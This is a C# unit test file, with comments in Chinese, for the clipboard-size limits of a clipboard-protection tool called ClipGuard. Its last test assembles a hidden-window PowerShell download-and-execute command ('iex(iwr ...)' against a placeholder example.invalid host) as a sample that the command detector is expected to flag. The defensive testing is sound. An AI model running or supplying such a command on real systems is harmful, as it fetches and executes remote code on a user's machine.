using ClipGuard.Core;

namespace ClipGuard.Core.Tests;

public class ClipboardLimitsTests
{
    private const int Max = ClipboardLimits.MaxAnalyzedChars;

    [Fact]
    public void 上限遠大於指令偵測的分析量()
    {
        // CommandDetector 最多分析 256 Ki 字；讀取上限至少要是它的幾倍，留空間給不計入的空白填充。
        Assert.True(Max >= 4 * 256 * 1024);
        Assert.True(Max >= SecretDetector.MaxScanLength);
        Assert.True(Max >= RegisteredSecretStore.MaxScanLength);
    }

    [Fact]
    public void 不超過上限就原樣保留()
    {
        var s = new string('a', Max);
        Assert.Same(s, ClipboardLimits.Prefix(s));
    }

    [Fact]
    public void 超過上限就截斷()
    {
        var s = new string('a', Max + 10);
        Assert.Equal(Max, ClipboardLimits.Prefix(s).Length);
    }

    [Fact]
    public void 不把代理對切成一半()
    {
        // 第 Max 個字是代理對的前半，截斷時整個代理對都不要。
        var s = new string('a', Max - 1) + "😀" + "tail";
        var p = ClipboardLimits.Prefix(s);
        Assert.Equal(Max - 1, p.Length);
        Assert.False(char.IsHighSurrogate(p[^1]));
    }

    [Fact]
    public void 截斷後指令偵測仍看得到開頭的指令()
    {
        // 片段組合，網址用 example.invalid；後面塞超過上限的填充。
        var cmd = "power" + "shell -w hidden -c \"iex(iwr 'https://x.example.invalid/a')\"";
        var text = cmd + "\n" + new string('a', Max + 1000);
        Assert.Equal(ThreatLevel.Malicious, CommandDetector.Analyze(ClipboardLimits.Prefix(text)).Level);
    }
}
